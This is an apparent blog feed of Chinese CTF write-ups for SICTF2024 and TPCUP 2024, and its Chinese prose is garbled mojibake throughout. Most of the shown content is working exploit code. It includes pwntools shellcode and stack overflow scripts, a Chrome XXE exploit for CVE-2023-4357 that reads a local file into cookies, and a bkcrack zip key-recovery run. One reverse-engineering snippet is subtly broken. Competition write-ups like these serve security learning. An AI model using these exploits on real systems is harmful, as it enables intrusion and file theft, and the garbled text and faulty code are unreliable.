gettimeofdayï¼ˆ0x60ï¼‰ï¼Œptraceï¼ˆ0x65ï¼‰</p><p>ä¹Ÿå°±æ˜¯åˆ†åˆ«å¯¹åº”äº†è¾“â¼Šâ»“åº¦ä¸º6ï¼Œ11ï¼Œ16å­—èŠ‚ã€‚ï¼ˆæ³¨æ„ptraceåœ¨åŠ¨è°ƒæ—¶æ˜¯è¿”å›-1çš„ï¼‰</p><p>æˆ‘ä»¬ç›´æ¥ä½¿â½¤ptraceæ‰“ï¼ˆè¿™é¢˜å…¶å®11å­—èŠ‚å°±å¤Ÿäº†ï¼Œä¹Ÿå°±æ˜¯gettimeofdayå°±èƒ½è¿‡ï¼Œè°ƒè¯•ä¹Ÿç›¸å¯¹â½…ä¾¿ï¼‰ï¼Œâ»“åº¦ä¸å¤Ÿå°±æŠŠç¬¬â¼†æ®µpayloadç»™readåˆ°0x1919820åâ¾¯ï¼Œç„¶åå°±æ˜¯â¼€æ³¢orwï¼Œä¸è¿‡è¦æ³¨æ„ï¼Œè¿™â¾¥è°ƒâ½¤execveä¼šå¤±è´¥ï¼Œç›´æ¥â½¤pwntoolsçš„shellcraftåº”è¯¥æ˜¯ä¸â¾çš„</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">2</span> context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="number">3</span> context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> p = process(<span class="string">&#x27;./bugzapper&#x27;</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">8 add rax, 0x10 ; rax = 0x1919820</span></span><br><span class="line"><span class="string">9 mov rsi, rax</span></span><br><span class="line"><span class="string">10 mov edx, 0x80</span></span><br><span class="line"><span class="string">11 xor eax, eax</span></span><br><span class="line"><span class="string">12 syscall</span></span><br><span class="line"><span class="string">13 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">14</span> payload = <span class="string">b&#x27;H\x83\xc0\x10H\x89\xc6\xba\x80\x00\x00\x001\xc0\x0f\x05&#x27;</span></span><br><span class="line"><span class="number">15</span> <span class="comment"># assert len(payload) == 0x10</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">17</span> p.recv()</span><br><span class="line"><span class="number">18</span> p.send(payload)</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">21 mov eax, 0x67616c66</span></span><br><span class="line"><span class="string">22 mov [esi - 0x10], rax</span></span><br><span class="line"><span class="string">23</span></span><br><span class="line"><span class="string">24 // è¿™â¾¥æ˜¯ç¡®è®¤ &quot;flag&quot; å·²ç»å†™â¼Šäº† 0x1919810</span></span><br><span class="line"><span class="string">25 // write(1, 0x1919810, 0x20)</span></span><br><span class="line"><span class="string">26 mov edi, 1</span></span><br><span class="line"><span class="string">27 sub esi, 0x10 ; rsi = 0x1919810</span></span><br><span class="line"><span class="string">28 mov edx, 0x20</span></span><br><span class="line"><span class="string">29 mov eax, 0x1</span></span><br><span class="line"><span class="string">30 syscall</span></span><br><span class="line"><span class="string">31</span></span><br><span class="line"><span class="string">32 // open(&quot;flag&quot;, 0, 0)</span></span><br><span class="line"><span class="string">33 mov edi, esi</span></span><br><span class="line"><span class="string">34 xor esi, esi</span></span><br><span class="line"><span class="string">35 xor edx, edx</span></span><br><span class="line"><span class="string">36 mov eax, 2</span></span><br><span class="line"><span class="string">37 syscall</span></span><br><span class="line"><span class="string">38</span></span><br><span class="line"><span class="string">39 // read(3, 0x1919870, 0x40)</span></span><br><span class="line"><span class="string">40 mov esi, 0x1919870</span></span><br><span class="line"><span class="string">41 mov edi, 3</span></span><br><span class="line"><span class="string">42 mov edx, 0x40</span></span><br><span class="line"><span class="string">43 mov eax, 0</span></span><br><span class="line"><span class="string">44 syscall</span></span><br><span class="line"><span class="string">45</span></span><br><span class="line"><span class="string">46 // write(1, 0x1919870, 0x40)</span></span><br><span class="line"><span class="string">47 mov edi, 1</span></span><br><span class="line"><span class="string">48 mov eax, 1</span></span><br><span class="line"><span class="string">49 syscall</span></span><br><span class="line"><span class="string">50</span></span><br><span class="line"><span class="string">51 // exit(0)</span></span><br><span class="line"><span class="string">52 mov edi, 0</span></span><br><span class="line"><span class="string">53 mov eax, 0x3c</span></span><br><span class="line"><span class="string">54 syscall</span></span><br><span class="line"><span class="string">55 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">56</span> payload = <span class="string">b&#x27;\xb8flaggH\x89F\xf0\xbf\x01\x00\x00\x00\x83\xee\x10\xba\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x89\xf71\xf61\xd2\xb8\x02\x00\x00\x00\x0f\x05\xbep\x98\x91\x01\xbf\x03\x00\x00\x00\xba@\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xbf\x00\x00\x00\x00\xb8&lt;\x00\x00\x00\x0f\x05&#x27;</span></span><br><span class="line"><span class="number">57</span> p.send(payload)</span><br><span class="line"><span class="number">58</span></span><br><span class="line"><span class="number">59</span> p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Bug-Zapper-Pro"><a href="#Bug-Zapper-Pro" class="headerlink" title="Bug Zapper Pro+"></a>Bug Zapper Pro+</h3><p><em>å‡ºé¢˜â¼ˆï¼šæ¤°å¥¶</em></p><p><em>é¢˜â½¬æè¿°ï¼šæ„Ÿè°¢æ‚¨â¼€ç›´ä»¥æ¥çš„â½€æŒï¼Œæ‰€ä»¥ä¸ºäº†å›é¦ˆâ½¼â½¤â¼¾ï¼Œæˆ‘ä»¬æ¨å‡ºäº†è¿™æ¬¾å…¨æ–°çš„Bug zapper pro</em></p><p><em>+ï¼Œæœ‰ä»»ä½•é—®é¢˜æ¬¢è¿å‘æˆ‘ä»¬åé¦ˆ</em></p><p>é€šè¿‡å¼‚æˆ–ç­‰æ„é€ â¼€ä¸ªsyscallå‡ºæ¥ï¼Œç„¶åä¸ºäº†â½…ä¾¿ç›´æ¥æŠŠrdxè®¾ç½®ä¸º114514xxxé‚£ç©æ„ï¼Œæ‰€ä»¥è·‘è„šæœ¬å»ºè®®</p><p>åâ¾¯çš„payloadåœ¨sendå‰æœ€å¥½pauseâ¼€ä¸‹ï¼Œâ¼€èµ·å‘çš„è¯æœ‰å¯èƒ½ä¼šç”±äºreadâ»“åº¦å¤ªâ¼¤å¯¼è‡´åâ¾¯çš„payload</p><p>åœ¨â¼€å¼€å§‹ä¹Ÿè¢«è¯»è¿›å»ï¼ˆ</p><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>æ ˆæº¢å‡ºä¿®æ”¹stringçš„å¼•â½¤ä¸ºstack_chkçš„gotåœ°å€ï¼Œä»â½½ä¿®æ”¹gotè¡¨ä¸ºåâ»”åœ°å€ï¼ŒåŒæ—¶è¦†ç›–canaryè§¦å‘å</p><p>â»”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1 from pwn import *</span><br><span class="line"></span><br><span class="line">2 context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">4 *#p = process(&#x27;./overflow&#x27;)*</span><br><span class="line"></span><br><span class="line">5 p = remote(&quot;xxxxxxxx&quot;, xxxxx)</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line"></span><br><span class="line">7 backdoor = 0x4011d0</span><br><span class="line"></span><br><span class="line">8 chk_got = 0x404018</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line"></span><br><span class="line">10 *#gdb.attach(p)*</span><br><span class="line"></span><br><span class="line">11 p.recvuntil(b&#x27;?\n&#x27;)</span><br><span class="line"></span><br><span class="line">12 payload = p64(backdoor) + b&#x27;b&#x27; * 0xa0 + p64(chk_got)</span><br><span class="line"></span><br><span class="line">13 p.sendline(payload.ljust(0x150, b&#x27;a&#x27;))</span><br><span class="line"></span><br><span class="line">14</span><br><span class="line"></span><br><span class="line">15 p.interactive()</span><br></pre></td></tr></table></figure><h3 id="What-only-libc"><a href="#What-only-libc" class="headerlink" title="What?!only libc?!"></a>What?!only libc?!</h3><h3 id="TalBoom"><a href="#TalBoom" class="headerlink" title="TalBoom"></a>TalBoom</h3><p><em>å‡ºé¢˜â¼ˆï¼šTokameinE</em></p><p><em>é¢˜â½¬æè¿°ï¼šæˆ‘ä»¬ä»æ¥å¥‰â¾æ²¡æœ‰æ”¿ç­–å°±æ˜¯æˆ‘ä»¬çš„æ”¿ç­–ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“ç®—ä»€ä¹ˆä¹Ÿä¸åšï¼Œä»»ç”±ææ€–åˆ†â¼¦ä»¬é—¹</em>å§ã€‚ï¼ˆæœ¬é¢˜æœ‰å›æ˜¾ï¼Œè¿æ¥åè¯·ç¨ä½œç­‰å¾…ï¼‰*</p><p>flagï¼šToka{Who_has_four_legs_in_the_morning_two_legs_at_noon_and_three_legs_in_theevening?}æœ¬é¢˜ä¸å…¬å¸ƒä»»ä½•é™„ä»¶ã€‚</p><p>çœ‹äº†â¼€ä¸‹â¼¤å“¥ä»¬çš„è§£æ³•ï¼Œâ¾®å¸¸ä¼˜ç§€ï¼Œæ‰€ä»¥åœ¨æ­¤å°±ä¸å…¬å¼€é¢„æœŸè§£ exp äº†ï¼Œä¸»è¦èŠèŠâ¾®é¢„æœŸçš„â¼€ä¸ªå¥½åŠ</p><p>æ³•ï¼Œæ¥â¾ƒKaliseå¸ˆå‚…ã€‚</p><p>é¢˜â½¬æ¯æ¬¡nc éƒ½ä¼šæ„å»ºä¸åŒçš„â¼†è¿›åˆ¶ï¼Œâ½½æ¯ä¸ªâ¼†è¿›åˆ¶éƒ½æœ‰â¼€ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ç‚¹ï¼Œå¦‚æœèƒ½å¤Ÿè®©ç¨‹åºåˆ°</p><p>è¾¾ï¼Œåˆ™å¯ä»¥ç›´æ¥ROPå®Œæˆåˆ©â½¤ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œåˆ°è¾¾çš„è¾“â¼Šæ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œå› æ­¤é¢„æœŸè§£æ˜¯éœ€è¦é€šè¿‡</p><p>â¾ƒåŠ¨åŒ–çš„â¼¿æ®µåŠ¨æ€åˆ†æç¨‹åºæ¥è§£å‡ºè¾“â¼Šã€‚ä½†æ˜¯Kaliseå¸ˆå‚…çš„â½…æ³•åˆ™å¾ˆç®€å•ï¼Œç”±äºç¨‹åºæ˜¯ç±»ä¼¼äº Switch çš„åˆ†å‘â½…å¼ï¼Œæ‰€ä»¥æ¯ä¸ªâ¼†è¿›åˆ¶â½‚ä»¶å®é™…ä¸Š</p><p>ä¹‹åªæœ‰é‚£ä¸ªstrcmpæ˜¯ä¸åŒçš„ï¼Œâ½½åç§»åˆ™å…¨éƒ¨ç›¸åŒï¼Œé‚£ä¹ˆåªè¦å¯¹ç€æŸä¸ªåˆ†â½€å¼ºâ¾çˆ†ç ´ï¼Œåœ¨é¢„æœŸçš„æ—¶é—´å†…</p><p>å°±å¯ä»¥æ’å‡ºé‚£ä¸ªæ ˆæº¢å‡ºï¼Œâ½½åªéœ€è¦æå–ç‰¹å®šåœ°å€çš„å­—ç¬¦ä¸²å°±èƒ½æ‹¿åˆ°è¯¥åˆ†â½€çš„è¾“â¼Šï¼Œæ‰€ä»¥ç„ç€æ‰“å°±â¾</p><p>äº†ã€‚æ®è¯¥å¸ˆå‚…æ‰€è¯´ï¼Œ15åˆ†é’Ÿå·¦å³å³å¯å®Œæˆçˆ†ç ´ã€‚</p><p>è¿™â¾¥å°±ä¸æ”¾è¿™ä½å¸ˆå‚…çš„ exp äº†</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Baby-c"><a href="#Baby-c" class="headerlink" title="Baby_c++"></a>Baby_c++</h3><p>å’±ä¹Ÿä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œæ‰“å¼€IDAï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²å°±çœ‹åˆ°äº†</p><p>é¢„æœŸæ˜¯æ‰¾åˆ°flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">83</span>,<span class="number">73</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">52</span>,<span class="number">101</span>,<span class="number">52</span>,<span class="number">55</span>,<span class="number">52</span>,<span class="number">98</span>,<span class="number">56</span>,<span class="number">97</span>,<span class="number">45</span>,<span class="number">57</span>,<span class="number">100</span>,<span class="number">102</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">52</span>,<span class="number">98</span>,<span class="number">45</span>,<span class="number">57</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">100</span>,<span class="number">52</span>,<span class="number">102</span>,<span class="number">53</span>,<span class="number">101</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">53</span>,<span class="number">49</span>,<span class="number">102</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Ez-pyc"><a href="#Ez-pyc" class="headerlink" title="Ez_pyc"></a>Ez_pyc</h3><p>pycç¼–è¯‘</p><p>ï¼ˆçœŸæœäº†ï¼Œä¸€ç›´æƒ³ç€æ˜¯èµ°è¿·å®«ï¼Œï¼Œï¼Œï¼Œè¿™ä¹ˆæ˜æ˜¾éƒ½æ²¡çœ‹å‡ºæ¥æ˜¯æ•°ç‹¬</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226125713782.png" alt="image-20240226125713782"></p><p>å°†è§£è½¬ä¸º16è¿›åˆ¶</p><p>è¾“â¼Šå†…å®¹ï¼š</p><p>6320870e5352469014668584c7f3229334e22689b45a64f926b5c</p><p>å¾—åˆ°flag</p><h3 id="SweetTofu"><a href="#SweetTofu" class="headerlink" title="SweetTofu"></a>SweetTofu</h3><p>è¿œç¨‹åŠ¨æ€è°ƒè¯•å¯ä»¥ï¼Œï¼Œæˆ‘åœ¨æƒ³ã€‚è™šæ‹Ÿæœºå¥½å•Šã€‚ã€‚</p><h3 id="virus-n-lys1s"><a href="#virus-n-lys1s" class="headerlink" title="virus-?n?lys1s"></a>virus-?n?lys1s</h3><p>#æ ¡éªŒphpï¼Œstrpos()å› ä¸ºphpç‰ˆæœ¬å¤ªä½äº†ï¼Œwebä½¬ç»•è¿‡</p><ul><li>espå®šå¾‹è„±å£³</li><li>ç¬¬äºŒé—®è®°å¾—æŒ‚ä»£ç†ï¼ˆgoogleï¼ˆæ–­</li><li>åŠ¨è°ƒ</li><li>å¯åŠ¨å­è¿›ç¨‹ï¼Œç±»ä¼¼äºSMCçš„â¼¿æ®µï¼Œæ¥è§£å¯†â½‚ä»¶å¹¶ä¸”ä¿®å¤â½‚ä»¶å¤´</li><li>è¡Œä¸ºè®°å½•ï¼Œwyt.exe,ç¿»VTä¿¡æ¯</li><li>ç›´æ¥å¾®æ­¥æƒ…æŠ¥ï¼ˆåŠ¨æ€IP</li></ul><p><a href="https://s.threatbook.com/report/file/797c253df096431e69f1aa84f0010f248384fe437cda4bf8df916c48fbb7984f">https://s.threatbook.com/report/file/797c253df096431e69f1aa84f0010f248384fe437cda4bf8df916c48fbb7984f</a></p><h3 id="Close-me"><a href="#Close-me" class="headerlink" title="Close me"></a>Close me</h3><p><em>â¤</em>*<del>æ‚</del>â»¥~<strong>â¤</strong>ï¼Œä½ èƒ½å…³çš„æ‰å—~~<strong>â¤</strong>ï¼ˆè™½ç„¶ä¸æ˜¯ç—…æ¯’ï¼Œä¸è¿‡å¦‚æœè¦è¿â¾çš„è¯è¿˜æ˜¯å»ºè®®è™šæ‹Ÿæœºå§*<em>^_^ï¼‰</em></p><p><em>è¯·æ‰¾åˆ°èƒ½å¤Ÿæ­£å¸¸å…³é—­çš„æ¡ä»¶ï¼ˆå³ä¸é€šè¿‡ç›´æ¥ç»ˆâ½Œè¿›ç¨‹çš„â½…å¼æˆ–è€…ç¨‹åºå´©æºƒå¯¼è‡´çš„å…³é—­ï¼‰</em></p><h4 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>â¾¸å…ˆç¿»åˆ°ä¸‹â¾¯å‘ç°æœ‰â¼€ä¸ªxorï¼Œè§£å¯†â¼€ä¸‹çœ‹çœ‹å¾—åˆ°â¼€æ®µhint</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SICTF2024&quot;&gt;&lt;a href=&quot;#SICTF2024&quot; class=&quot;headerlink&quot; title=&quot;SICTF2024&quot;&gt;&lt;/a&gt;SICTF2024&lt;/h1&gt;&lt;h2 id=&quot;Forensics&quot;&gt;&lt;a href=&quot;#Forensics&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>èººå¹³æ¯</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-03-02T08:33:39.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TPCUP-2024"><a href="#TPCUP-2024" class="headerlink" title="TPCUP 2024"></a>TPCUP 2024</h1><h2 id="Xâ€¦ä»€ä¹ˆï¼Ÿ"><a href="#Xâ€¦ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Xâ€¦ä»€ä¹ˆï¼Ÿ"></a>Xâ€¦ä»€ä¹ˆï¼Ÿ</h2><p>çœ‹åˆ° chrome-114.0.5735.90 æœç´¢ä¸‹è¿™ä¸ªç‰ˆæœ¬å¯ä»¥æ‰¾åˆ° CVE-2023-4357 æ¼æ´å¤ç°ï¼Œä½¿ç”¨ <a href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">xcanwin&#x2F;CVE-2023-4357-Chrome-XXE</a> çš„å•æ–‡ä»¶ EXPï¼Œæ”¹æˆè¯»å– flagï¼Œç„¶ååŠ ä¸Šå†™å…¥ cookies çš„ä»£ç ã€‚</p><p>ç”±äºåŒæ—¶è¦æœ‰ svg å’Œ xml è§£æï¼Œæ‰€ä»¥ Content-Type è®¾ä¸º <code>image/svg+xml</code>ï¼Œå¯ä»¥è‡ªå·±æ­å»ºæœ¬åœ°ç¯å¢ƒçœ‹çœ‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- d.svg --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;?#&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">div</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_p</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;&amp;passwd_p;&quot;</span>&gt;</span>&amp;passwd_c;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:40rem&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">forEach</span>(p =&amp;gt; &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="property">cookie</span>=p.<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åè®¿é—® <code>/d.svg</code> å³å¯</p><p><code>flag&#123;XXE_is_alSo_y0ur_g0oD_fR13Nd&#125;</code></p><blockquote><p>æ²¡ä¿®å‰å·²ç»èƒ½è¯» <code>/etc/passwd</code> äº†ï¼Œä½†è¯» <code>/flag</code> æ²¡ç»“æœã€‚ä»¥ä¸ºæ˜¯æ²¡æƒé™éœ€è¦ææƒï¼Œç»“æœæ˜¯æ²¡æ”¾ flagï¼ˆ<br>è¯è¯´ä¸ºä»€ä¹ˆè¯»å¾—äº† <code>/usr/src/app/requirements.txt</code> ä½†è¯»ä¸äº† <code>xssbot.py</code> å‘¢</p></blockquote><h2 id="Uncrackable"><a href="#Uncrackable" class="headerlink" title="Uncrackable"></a>Uncrackable</h2><h3 id="æ›´æ–°é™„ä»¶å"><a href="#æ›´æ–°é™„ä»¶å" class="headerlink" title="æ›´æ–°é™„ä»¶å"></a>æ›´æ–°é™„ä»¶å</h3><p>zip å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼Œç”¨ <code>zipinfo</code> æŸ¥çœ‹ä¸‹å‹ç¼©åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â¯ zipinfo prob05.zip</span><br><span class="line">Archive:  prob05.zip</span><br><span class="line">Zip file size: 3545476 bytes, number of entries: 2</span><br><span class="line">-rw----     0.0 fat   109332 T- defN 24-Feb-13 18:53 anticheat.js</span><br><span class="line">-rw----     0.0 fat  3550103 B- defN 24-Feb-13 18:53 uncrackable.m4a</span><br><span class="line">2 files, 3659435 bytes uncompressed, 3545224 bytes compressed:  3.1%</span><br></pre></td></tr></table></figure><p><code>anticheat.js</code> æ–‡ä»¶æ˜¯å·²çŸ¥çš„ï¼Œå¯ä»¥ä» <a href="https://www.tpcup.org/anticheat.js">https://www.tpcup.org/anticheat.js</a> ä¸‹è½½ï¼Œéœ€è¦å‹ç¼©åæ‰å¯ä»¥ç”¨å·¥å…· (bkcrack&#x2F;rbkcrack&#x2F;pkcrack) çˆ†ç ´å¯†é’¥</p><p>è¿™é¢˜å’Œå‹ç¼©å·¥å…·å…³ç³»å¾ˆå¤§ï¼Œä½¿ç”¨ <code>pyminizip == 0.2.6</code> åœ¨ <code>compress_level = 0 or 6</code> ä¸‹å¯ä»¥æˆåŠŸï¼Œ<code>zip = 3.0-11.1</code> å’Œ <code>7z = 23.01</code> å‡å¤±è´¥ <del>ï¼Œè¿˜æ˜¯åœ¨ç¾¤èŠä¸­å¾—çŸ¥çš„å‹ç¼©å·¥å…·</del></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crypto.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyminizip</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;level:<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    pyminizip.compress(<span class="string">&quot;anticheat.js&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;anticheat.zip&quot;</span>, <span class="literal">None</span>, i)</span><br><span class="line">    <span class="comment"># os.system(&quot;zip -%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    <span class="comment"># os.system(&quot;7z a -tzip -mx%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    os.system(<span class="string">&quot;bkcrack -C prob05.zip -c anticheat.js -P anticheat.zip -p anticheat.js&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â¯ python crypto.py</span><br><span class="line">level:0</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[21:59:49] Z reduction using 44370 bytes of known plaintext</span><br><span class="line">26.0 % (11536 / 44370)</span><br><span class="line">[21:59:50] Attack on 155 Z values at index 33459</span><br><span class="line">Keys: d0043c88 20e5781d 2160b96d</span><br><span class="line">94.8 